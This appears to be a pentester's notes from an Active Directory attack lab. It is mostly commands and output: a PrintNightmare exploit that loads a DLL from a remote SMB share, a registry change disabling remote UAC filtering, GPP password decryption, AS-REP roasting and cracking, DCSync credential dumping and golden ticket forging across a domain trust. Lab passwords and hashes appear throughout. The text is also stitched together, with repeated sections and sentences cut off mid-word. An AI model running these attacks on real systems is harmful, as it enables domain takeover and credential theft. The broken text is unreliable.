python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\\\172.16.5.225\\CompData\\backupscript.dll' [*] Connecting to ncacn_np:172.16.5.5[\\PIPE\\spoolss] [+] Bind OK [+] pDriverPath Found C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL [*] Executing \\??\\UNC\\172.16.5.225\\CompData\\backupscript.dll [*] Try 1... [*] Stage0: 0 [*] Try 2... [*] Stage0: 0 [*] Try 3... Miscellaneous Misconfigurations Exchange Related Group Membership and Organization Management Look out for this group these are cery powerfull\nOrganization Management‚Äî‚Äî-\u003egeneric all on Exchange Windows Permissions‚Äî‚Äî-\u003ewritedacl on domain\nPrinter Bug can authenticate to any smb server just start ntlmrelayx and relay the hash to do stuff\nEnumerating for MS-PRN Printer Bug Miscellaneous Misconfigurations\nPS C:\\local\u003e Import-Module .\\SecurityAssessment.ps1 PS C:\\local\u003e Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL ComputerName Status ------------ ------ ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL True MS14-068 This was a flaw in the Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin. A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.\nThe vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. This can be leveraged to create a fake PAC, presenting a user as a member of the Domain Administrators or other privileged group. It can be exploited with tools such as the Python Kerberos Exploitation Kit (PyKEK) or the Impacket toolkit. The only defense against this attack is patching. The machine Mantis on the Hack The Box platform showcases this vulnerabilit\nEnumerating DNS Records(Active directory) Using adidnsdump Miscellaneous Misconfigurations\ncube111@local[/local]$ adidnsdump -u inlanefreight\\\\forend ldap://172.16.5.5 Password: [-] Connecting to host... [-] Binding to host [+] Bind OK [-] Querying zone for records Using the -r Option to Resolve Unknown Records Miscellaneous Misconfigurations\ncube111@local[/local]$ adidnsdump -u inlanefreight\\\\forend ldap://172.16.5.5 -r Password: [-] Connecting to host... [-] Binding to host [+] Bind OK [-] Querying zone for records [+] Found 27 records Viewing the Contents of the records.csv File Miscellaneous Misconfigurations\ncube111@local[/local]$ head records.csv type,name,value ?,LOGISTICS,? AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691 AAAA,ForestDnsZones,dead:beef::231 A,ForestDnsZones,10.129.202.29 A,ForestDnsZones,172.16.5.240 A,ForestDnsZones,172.16.5.5 AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691 AAAA,DomainDnsZones,dead:beef::231 A,DomainDnsZones,10.129.202.29 UAC BYPASS\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f gpupdate /force net stop server \u0026\u0026 net start server Finding Passwords in the Description Field using Get-Domain User Checking for PASSWD_NOTREQD Setting using Get-DomainUser Miscellaneous Misconfigurations\nPS C:\\local\u003e Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol samaccountname useraccountcontrol -------------- ------------------ guest ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD mlowe PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD ehamilton PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD $725000-9jb50uejje9f ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT nagiosagent PASSWD_NOTREQD, NORMAL_ACCOUNT Credentials in SMB Shares and SYSVOL Scripts hecking for PASSWD_NOTREQD Setting using Get-DomainUser Miscellaneous Misconfigurations\nPS C:\\local\u003e Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol samaccountname useraccountcontrol -------------- ------------------ guest ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD mlowe PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD ehamilton PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD $725000-9jb50uejje9f ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT nagiosagent PASSWD_NOTREQD, NORMAL_ACCOUNT Credentials in SMB Shares and SYSVOL Scripts The SYSVOL share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain. It is worth digging around this directory to hunt for passwords stored in scripts. Sometimes we will find very old scripts containing since disabled accounts or old passwords, but from time to time, we will strike gold, so we should always dig through this directory. Here, we can see an interesting script named reset_local_admin_pass.vbs.\nDiscovering an Interesting Script Miscellaneous Misconfigurations\nPS C:\\local\u003e ls \\\\academy-ea-dc01\\SYSVOL\\INLANEFREIGHT.LOCAL\\scripts Directory: \\\\academy-ea-dc01\\SYSVOL\\INLANEFREIGHT.LOCAL\\scripts Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 11/18/2021 10:44 AM 174 daily-runs.zip -a---- 2/28/2022 9:11 PM 203 disable-nbtns.ps1 -a---- 3/7/2022 9:41 AM 144138 Logon Banner.htm -a---- 3/8/2022 2:56 PM 979 reset_local_admin_pass.vbs Finding a Password in the Script Miscellaneous Misconfigurations\nPS C:\\local\u003e cat \\\\academy-ea-dc01\\SYSVOL\\INLANEFREIGHT.LOCAL\\scripts\\reset_local_admin_pass.vbs On Error Resume Next strComputer = \".\" Set oShell = CreateObject(\"WScript.Shell\") sUser = \"Administrator\" sPwd = \"!ILFREIGHT_L0cALADmin!\" Set Arg = WScript.Arguments If Arg.Count \u003e 0 Then sPwd = Arg(0) 'Pass the password as parameter to the script End if 'Get the administrator name Set objWMIService = GetObject(\"winmgmts:\\\\\" \u0026 strComputer \u0026 \"\\root\\cimv2\") \u003cSNIP\u003e Group Policy Preferences (GPP) Passwords When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:\nMap drives (drives.xml) Create local users Create printer config files (printers.xml) Creating and updating services (services.xml) Creating scheduled tasks (scheduledtasks.xml) Changing local admin passwords. Decrypting the Password with gpp-decrypt Miscellaneous Misconfigurations\ncube111@local[/local]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE Password1 ube111@local[/local]$ crackmapexec smb -L | grep gpp [*] gpp_autologin Searches the domain controller for registry.xml to find autologon information and returns the username and password. [*] gpp_password Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences. Using CrackMapExec‚Äôs gpp_autologin Module Miscellaneous Misconfigurations\ncube111@local[/local]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin SMB 172.16.5.5 445 ACADEMY-EA-DC01 [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False) SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\\forend:Klmcargo2 GPP_AUTO... 172.16.5.5 445 ACADEMY-EA-DC01 [+] Found SYSVOL share GPP_AUTO... 172.16.5.5 445 ACADEMY-EA-DC01 [*] Searching for Registry.xml GPP_AUTO... 172.16.5.5 445 ACADEMY-EA-DC01 [*] Found INLANEFREIGHT.LOCAL/Polic ASREPRoasting S C:\\local\u003e Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl samaccountname : mmorgan userprincipalname : mmorgan@inlanefreight.local useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH Miscellaneous Misconfigurations\nPS C:\\local\u003e .\\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.0.2 [*] Action: AS-REP roasting [*] Target User : mmorgan [*] Target Domain : INLANEFREIGHT.LOCAL [*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(\u0026(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))' [*] SamAccountName : mmorgan Cracking the Hash Offline with Hashcat Miscellaneous Misconfigurations\ncube111@local[/local]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... \u003cSNIP\u003e $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f4e0537e0188a6897a478c55$0978822dec13046712db7dc03f6c4de059a946485451aae98bb93dff8e3e64f3aa5614160f21a029c2b9437cb16e5e9da4a2870fec0596b09bada989d1f8057262ea40840e8d0f20313b4e9a40fa5e4f987ff404313227a7bffae748e07201369d48abb4727dfe1a9f09d50d7ee3aa5c13e4433e0f9217533ee0e74b02eb8907e13a208340728f794ed5103cb3e5c7915bf2f449afda41988ff48a356bf2be680a25931a8746a99ad3e757bfe097b852f72ceae1b74720c011cff7ec94cbb6456982f14da17213b3b27dfa1ad4c7b5c7120db0d70763549e5144f1f5ee2ac71ddfc4dca9d25d39737dc83b6bc60e0a0054fc0fd2b2b48b25c6ca:Welcome!00 Session..........: hashcat Status...........: Cracked Hash.Name........: Kerberos 5, etype 23, AS-REP Hash.Target......: $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f...25c6ca Time.Started.....: Fri Apr 1 13:18:40 2022 (14 secs) Time.Estimated...: Fri Apr 1 13:18:54 2022 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 782.4 kH/s (4.95ms) @ Accel:32 Loop Retrieving the AS-REP Using Kerbrute Miscellaneous Misconfigurations\ncube111@local[/local]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u003c / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop 2022/04/01 13:14:17 \u003e Using KDC(s): 2022/04/01 13:14:17 \u003e 172.16.5.5:88 2022/04/01 13:14:17 \u003e [+] VALID USERNAME:\tsbrown@inlanefreight.local 2022/04/01 13:14:17 \u003e [+] VALID USERNAME:\tjjones@inlanefreight.local 2022/04/01 13:14:17 \u003e [+] VALID USERNAME:\ttjohnson@inlanefreight.local 2022/04/01 13:14:17 \u003e [+] VALID USERNAME:\tjwilson@inlanefreight.local 2022/04/01 13:14:17 \u003e [+] VALID USERNAME:\tbdavis@inlanefreight.local 2022/04/01 13:14:17 \u003e [+] VALID USERNAME:\tnjohnson@inlanefreight.local 2022/04/01 13:14:17 \u003e [+] VALID USERNAME:\tasanchez@inlanefreight.local 2022/04/01 13:14:17 \u003e [+] VALID USERNAME:\tdlewis@inlanefreight.local 2022/04/01 13:14:17 \u003e [+] VALID USERNAME:\tccruz@inlanefreight.local 2022/04/01 13:14:17 \u003e [+] mmorgan has no pre auth required. Dumping hash to crack offline: $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda575be3d429aad39ec68a33$8698ee566cde591a7ddd1782db6f7ed8531e266befed4856b9fcbbdda83a0c9c5ae4217b9a43d322ef35a6a22ab4cbc86e55a1fa122a9f5cb22596084d6198454f1df2662cb00f513d8dc3b8e462b51e8431435b92c87d200da7065157a6b24ec5bc0090e7cf778ae036c6781cc7b94492e031a9c076067afc434aa98e831e6b3bff26f52498279a833b04170b7a4e7583a71299965c48a918e5d72b5c4e9b2ccb9cf7d793ef322047127f01fd32bf6e3bb5053ce9a4bf82c53716b1cee8f2855ed69c3b92098b255cc1c5cad5cd1a09303d83e60e3a03abee0a1bb5152192f3134de1c0b73246b00f8ef06c792626fd2be6ca7af52ac4453e6a \u003cSNIP\u003e cube111@local[/local]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users impacket-GetNPUsers cube.local/irfandc -no-pass -request -format hashcat -dc-ip 192.168.10.2 Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation [-] User sbrown@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User jjones@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User tjohnson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User jwilson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User bdavis@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User njohnson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User asanchez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User dlewis@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User ccruz@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8345dd9247a0e3d$b62d45bc3c0f4c306402a205ebdbbc623d77ad016e657337630c70f651451400329545fb634c9d329ed024ef145bdc2afd4af498b2f0092766effe6ae12b3c3beac28e6ded0b542e85d3fe52467945d98a722cb52e2b37325a53829ecf127d10ee98f8a583d7912e6ae3c702b946b65153bac16c97b7f8f2d4c2811b7feba92d8bd99cdeacc8114289573ef225f7c2913647db68aafc43a1c98aa032c123b2c9db06d49229c9de94b4b476733a5f3dc5cc1bd7a9a34c18948edf8c9c124c52a36b71d2b1ed40e081abbfee564da3a0ebc734781fdae75d3882f3d1d68afdb2ccb135028d70d1aa3c0883165b3321e7a1c5c8d7c215f12da8bba9 [-] User rramirez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User jwallace@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User jsantiago@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set Group Policy Object (GPO) Abuse GPO misconfigurations can be abused to perform the following attacks:\nAdding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege) Adding a local admin user to one or more hosts Creating an immediate scheduled task to perform any number of actions Enumerating GPO Names with PowerView Miscellaneous Misconfigurations\nPS C:\\local\u003e Get-DomainGPO |select displayname displayname ----------- Default Domain Policy Default Domain Controllers Policy Deny Control Panel Access Disallow LM Hash Deny CMD Access Disable Forced Restarts Block Removable Media Disable Guest Account Service Accounts Password Policy Logon Banner Disconnect Idle RDP Disable NetBIOS AutoLogon GuardAutoLogon Enumerating GPO Names with a Built-In Cmdlet Miscellaneous Misconfigurations\nPS C:\\local\u003e Get-GPO -All | Select DisplayName DisplayName ----------- Certificate Services Default Domain Policy Disable NetBIOS Disable Guest Account AutoLogon Default Domain Controllers Policy Disconnect Idle RDP Disallow LM Hash Deny CMD Access Block Removable Media GuardAutoLogon Service Accounts Password Policy Logon Banner Disable Forced Restarts Deny Control Panel Access Enumerating Domain User GPO Rights Miscellaneous Misconfigurations\nPS C:\\local\u003e $sid=Convert-NameToSid \"Domain Users\" PS C:\\local\u003e Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid} ObjectDN : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL ObjectSID : ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl, WriteOwner BinaryLength : 36 AceQualifier : AccessAllowed IsCallback : False OpaqueLength : 0 AccessMask : 983095 SecurityIdentifier : S-1-5-21-3842939050-3880317879-2865463114-513 AceType : AccessAllowed AceFlags : ObjectInherit, ContainerInherit IsInherited : False InheritanceFlags : ContainerInherit, ObjectInherit PropagationFlags : None AuditFlags : None PS C:\\local Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532 DisplayName : Disconnect Idle RDP DomainName : INLANEFREIGHT.LOCAL Owner : INLANEFREIGHT\\Domain Admins Id : 7ca9c789-14ce-46e3-a722-83f4097af532 GpoStatus : AllSettingsEnabled Description : CreationTime : 10/28/2021 3:34:07 PM ModificationTime : 4/5/2022 6:54:25 PM UserVersion : AD Version: 0, SysVol Version: 0 ComputerVersion : AD Version: 0, SysVol Version: 0 WmiFilter : Checking in BloodHound, we can see that the Domain Users group has several rights over the Disconnect Idle RDP GPO, which could be leveraged for full control of the object.\nIf we select the GPO in BloodHound and scroll down to Affected Objects on the Node Info tab, we can see that this GPO is applied to one OU, which contains four computer objects.\nWe could use a tool such as SharpGPOAbuse to take advantage of th\nDomain Trusts Primer PS C:\\local\u003e Get-ADTrust -Filter * Direction : BiDirectional DisallowTransivity : False DistinguishedName : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL ForestTransitive : False IntraForest : True IsTreeParent : False IsTreeRoot : False Name : LOGISTICS.INLANEFREIGHT.LOCAL ObjectClass : trustedDomain ObjectGUID : f48a1169-2e58-42c1-ba32-a6ccb10057ec SelectiveAuthentication PS C:\\local\u003e Get-DomainTrust SourceName : INLANEFREIGHT.LOCAL TargetName : LOGISTICS.INLANEFREIGHT.LOCAL TrustType : WINDOWS_ACTIVE_DIRECTORY TrustAttributes : WITHIN_FOREST TrustDirection : Bidirectional WhenCreated : 11/1/2021 6:20:22 PM WhenChanged : 2/26/2022 11:55:55 PM SourceName : INLANEFREIGHT.LOCAL TargetName : FREIGHTLOGISTICS.LOCAL TrustType : WINDOWS_ACTIVE_DIRECTORY TrustAttributes Using Get-DomainTrustMapping Domain Trusts Primer\nPS C:\\local\u003e Get-DomainTrustMapping SourceName : INLANEFREIGHT.LOCAL TargetName : LOGISTICS.INLANEFREIGHT.LOCAL TrustType : WINDOWS_ACTIVE_DIRECTORY TrustAttributes : WITHIN_FOREST TrustDirection : Bidirectional WhenCreated : 11/1/2021 6:20:22 PM WhenChanged : 2/26/2022 11:55:55 PM SourceName : INLANEFREIGHT.LOCAL TargetName : FREIGHTLOGISTICS.LOCAL TrustType : WINDOWS_ACTIVE_DIRECTORY TrustAttributes : FOREST_TRANSITIVE TrustDirection : Bidirectional WhenCreated : 11/1/2021 8:07:09 PM WhenChanged : 2/27/2022 12:02:39 AM SourceName : FREIGHTLOGISTICS.LOCAL TargetName : INLANEFREIGHT.LOCAL TrustType : WINDOWS_ACTIVE_DIRECTORY TrustAttributes : FOREST_TRANSITIVE TrustDirection : Bidirectional WhenCreated : 11/1/2021 8:07:08 PM WhenChanged : 2/27/2022 12:02:41 AM SourceName : LOGISTICS.INLANEFREIGHT.LOCAL TargetName : INLANEFREIGHT.LOCAL TrustType : WINDOWS_ACTIVE_DIRECTORY TrustAttributes : WITHIN_FOREST TrustDirection : Bidirectional WhenCreated : 11/1/2021 6:20:22 PM WhenChanged : 2/26/2022 11:55:55 PM Checking Users in the Child Domain using Get-DomainUser Domain Trusts Primer\nPS C:\\local\u003e Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName samaccountname -------------- local-student_adm Administrator Guest lab_adm krbtgt Using netdom to query domain trust Domain Trusts Primer\nC:\\local\u003e netdom query /domain:inlanefreight.local trust Direction Trusted\\Trusting domain Trust type ========= ======================= ========== \u003c-\u003e LOGISTICS.INLANEFREIGHT.LOCAL Direct Not found \u003c-\u003e FREIGHTLOGISTICS.LOCAL Direct Not found ExtraSids Attack - Mimikatz(Golden ticketrs) Obtaining the KRBTGT Account‚Äôs NT Hash using Mimikatz Attacking Domain Trusts - Child -\u003e Parent Trusts - from Windows\nPS C:\\local\u003e mimikatz # lsadump::dcsync /user:LOGISTICS\\krbtgt [DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain [DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server [DC] 'LOGISTICS\\krbtgt' will be the user account [rpc] Service : ldap [rpc] AuthnSvc : GSS_NEGOTIATE (9) Object RDN : krbtgt ** SAM ACCOUNT ** SAM Username : krbtgt Account Type : 30000000 ( USER_OBJECT ) User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT ) Account expiration : Password last change : 11/1/2021 11:21:33 AM Object Security ID : S-1-5-21-2806153819-209893948-922872689-502 Object Relative ID : 502 Credentials: Hash NTLM: 9d765b482771505cbe97411065964d5f ntlm- 0: 9d765b482771505cbe97411065964d5f lm - 0: 69df324191d4a80f0ed100c10f20561e Using Get-DomainSID Attacking Domain Trusts - Child -\u003e Parent Trusts - from Windows\nPS C:\\local\u003e Get-DomainSID S-1-5-21-2806153819-209893948-922872689 Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity \"Enterprise Admins\" | select distinguishedname,objectsid distinguishedname objectsid ----------------- --------- CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519 Creating a Golden Ticket with Mimikatz PS C:\\local\u003e mimikatz.exe mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt User : hacker Domain : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS) SID : S-1-5-21-2806153819-209893948-922872689 User Id : 500 Groups Id : *513 512 520 518 519 Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ; ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt Lifetime : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM -\u003e Ticket : ** Pass The Ticket ** * PAC generated * PAC signed * EncTicketPart generated * EncTicketPart encrypted * KrbCred generated Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session Confirming a Kerberos Ticket is in Memory Using klist Attacking Domain Trusts - Child -\u003e Parent Trusts - from Windows\nPS C:\\local\u003e klist Current LogonId is 0:0xf6462 Cached Tickets: (1) #0\u003e Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL KerbTicket Encryption Type: RSADSI RC4-HMAC(NT) Ticket Flags 0x40e00000 -\u003e forwardable renewable initial pre_authent Start Time: 3/28/2022 19:59:50 (local) End Time: 3/25/2032 19:59:50 (local) Renew Time: 3/25/2032 19:59:50 (local) Session Key Type: RSADSI RC4-HMAC(NT) Cache Flags: 0x1 -\u003e PRIMARY Kdc Called: Creating a Golden Ticket using Rubeus Attacking Domain Trusts - Child -\u003e Parent Trusts - from Windows\nPS C:\\local\u003e .\\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.0.2 [*] Action: Build TGT [*] Building PAC [*] Domain : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS) [*] SID : S-1-5-21-2806153819-209893948-922872689 [*] UserId : 500 [*] Groups : 520,512,513,519,518 [*] ExtraSIDs : S-1-5-21-3842939050-3880317879-2865463114-519 [*] ServiceKey : 9D765B482771505CBE97411065964D5F [*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5 [*] KDCKey : 9D765B482771505CBE97411065964D5F [*] KDCKeyType : KERB_CHECKSUM_HMAC_MD5 [*] Service : krbtgt [*] Target : LOGISTICS.INLANEFREIGHT.LOCAL Performing a DCSync Attack Attacking Domain Trusts - Child -\u003e Parent Trusts - from Windows\nPS C:\\Tools\\mimikatz\\x64\u003e .\\mimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## \u003e https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' \u003e https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz # lsadump::dcsync /user:INLANEFREIGHT\\lab_adm [DC] 'INLANEFREIGHT.LOCAL' will be the domain [DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server [DC] 'INLANEFREIGHT\\lab_adm' will be the user account [rpc] Service : ldap [rpc] AuthnSvc : GSS_NEGOTIATE (9) Object RDN : lab_adm ** SAM ACCOUNT ** SAM Username : lab_adm Account Type : 30000000 ( USER_OBJECT ) User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD ) Account expiration : Password last change : 2/27/2022 10:53:21 PM Object Security ID : S-1-5-21-3842939050-3880317879-2865463114-1001 Object Relative ID : 1001 When dealing with multiple domains and our target domain is not the same as the user‚Äôs domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller. The command for this would look like the following:\nAttacking Domain Trusts - Child -\u003e Parent Trusts - from Windows\nmimikatz # lsadump::dcsync /user:INLANEFREIGHT\\lab_adm /domain:INLANEFREIGHT.LOCAL [DC] 'INLANEFREIGHT.LOCAL' will be the domain [DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server [DC] 'INLANEFREIGHT\\lab_adm' will be the user account [rpc] Service : ldap [rpc] AuthnSvc : GSS_NEGOTIATE (9) Object RDN : lab_adm ** SAM ACCOUNT ** SAM Username : lab_adm Account Type : 30000000 ( USER_OBJECT ) User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD ) Account expiration : Password last change : 2/27/2022 10:53:21 PM Object Security ID : S-1-5-21-3842939050-3880317879-2865463114-1001 Object Relative ID : 1001 Credentials: Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6 ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6 ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6 lm - 0: 6053227db44e996fe16b10 Attacking Domain Trusts - Child -\u003e Parent Trusts - from Linux Performing DCSync with secretsdump.py Attacking Domain Trusts - Child -\u003e Parent Trusts - from Linux\ncube111@local[/local]$ secretsdump.py logistics.inlanefreight.local/local-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation Password: [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f::: [*] Kerberos keys grabbed krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8 krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e krbtgt:des-cbc-md5:fee04c3d026d7538 [*] Cleaning up... Next, we can use lookupsid.py from the Impacket toolkit to perform SID brute forcing to find the SID\nPerforming SID Brute Forcing using lookupsid.py Attacking Domain Trusts - Child -\u003e Parent Trusts - from Linux\ncube111@local[/local]$ lookupsid.py logistics.inlanefreight.local/local-student_adm@172.16.5.240 Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation Password: [*] Brute forcing SIDs at 172.16.5.240 [*] StringBinding ncacn_np:172.16.5.240[\\pipe\\lsarpc] [*] Domain SID is: S-1-5-21-2806153819-209893948-922872689 500: LOGISTICS\\Administrator (SidTypeUser) 501: LOGISTICS\\Guest (SidTypeUser) 502: LOGISTICS\\krbtgt (SidTypeUser) 512: LOGISTICS\\Domain Admins (SidTypeGroup) 513: LOGISTICS\\Domain Users (SidTypeGroup) Attacking Domain Trusts - Child -\u003e Parent Trusts - from Linux Performing DCSync with secretsdump.py Attacking Domain Trusts - Child -\u003e Parent Trusts - from Linux\ncube111@local[/local]$ secretsdump.py logistics.inlanefreight.local/local-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation Password: [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f::: [*] Kerberos keys grabbed krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8 krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e krbtgt:des-cbc-md5:fee04c3d026d7538 Performing SID Brute Forcing using lookupsid.py Attacking Domain Trusts - Child -\u003e Parent Trusts - from Linux\ncube111@local[/local]$ lookupsid.py logistics.inlanefreight.local/local-student_adm@172.16.5.240 